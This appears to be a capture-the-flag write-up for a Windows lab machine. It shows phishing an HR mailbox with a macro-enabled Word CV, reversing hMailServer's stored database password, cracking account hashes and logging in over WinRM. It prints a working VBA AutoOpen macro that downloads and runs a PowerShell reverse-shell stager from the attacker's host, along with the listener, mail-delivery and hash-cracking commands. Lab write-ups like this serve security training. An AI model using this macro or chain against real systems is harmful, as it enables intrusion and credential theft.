## Overview

JobTwo is a Hard Windows machine built around an **hMailServer** mail deployment and a job-application theme. The company website asks candidates to email a Microsoft Word CV to HR, and the mailbox processes attachments with macros enabled — so a macro-laden `.docm` gives us code execution as the first user. That user can read hMailServer's configuration, which stores its database password with reversible encryption. Decrypting it opens the mail account database, where a crackable password hash recovers a credential valid for WinRM, landing `user.txt`.

## Recon

```bash
nmap -sC -sV 10.129.238.35
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH for Windows 9.5 | |
| 25 | SMTP — **hMailServer** | accepts mail for `job2.vl` |
| 80 / 443 | HTTP / HTTPS | cert CN `www.job2.vl`, SAN `job2.vl` |
| 135 / 139 / 445 | MSRPC / SMB | |
| 3389 | RDP | domain `JOB2` |
| 5985 | WinRM | |
| 6160–6290, 10001–10006 | Veeam Backup ports | (relevant for privesc, out of scope here) |

The TLS certificate reveals the hostname `www.job2.vl`. Browsing the site shows a careers page: the company is hiring a captain and asks applicants to **send a CV as a Microsoft Word document to `hr@job2.vl`**. Combined with the open `hMailServer` SMTP service on port 25, that's a phishing setup — we can deliver our own document.

## Enumeration

Two facts line up into an attack:

- The HR page explicitly requests a **Word document** attachment.
- Port 25 (`hMailServer`) accepts mail for `job2.vl`, so we can send to `hr@job2.vl` directly.

A mailbox that auto-opens emailed Office documents with macros enabled means a document-open macro will execute on the server side.

## Foothold

Craft a macro-enabled document (`.docm`) whose `AutoOpen` macro pulls and runs a PowerShell stager:

```vb
Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
    ByVal lpCmdLine As String, ByVal uCmdShow As Long) As Long
Sub AutoOpen()
    WinExec "powershell.exe iex(iwr -uri http://<lhost>/shell.ps1 -UseBasicParsing)", 0
End Sub
```

Serve the stager and a catcher, then mail the document to HR:

```bash
python3 -m http.server 80          # serves shell.ps1
nc -lnvp 1337                      # catches the reverse shell
sendemail -s 10.129.238.35 -f "applicant@x.vl" -t hr@job2.vl -o tls=no -m "My CV" -a cv.docm
```

After a short delay the document is opened and we get a shell as `job2\julian`.

### Leaking hMailServer credentials

`julian` can read the hMailServer install. The INI file stores the database connection password with reversible "encryption":

```powershell
type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI"
# [Database] Type=MSSQLCE  Password=<reversibly-encrypted>  PasswordEncryption=1
```

That encryption is reversible, so the stored value decrypts back to the database password (e.g. with the `hm_decrypt` tool). With that password we open the mail account database (`hMailServer.sdf`, a SQL Server Compact file) and dump the `hm_accounts` table, which holds the user password hashes.

### Cracking to a WinRM credential

The account hashes are salted SHA-256 — fast to attack with a wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=hMailServer hash
# recovers the password for the Ferdinand account
```

The recovered `Ferdinand` credential works over WinRM:

```bash
nxc winrm 10.129.238.35 -u Ferdinand -p '<redacted>'
# JOB2\Ferdinand (Pwn3d!)
```

## User flag

```bash
nxc winrm 10.129.238.35 -u Ferdinand -p '<redacted>' -X 'type C:\Users\Ferdinand\Desktop\user.txt'
# HTB{...}
```
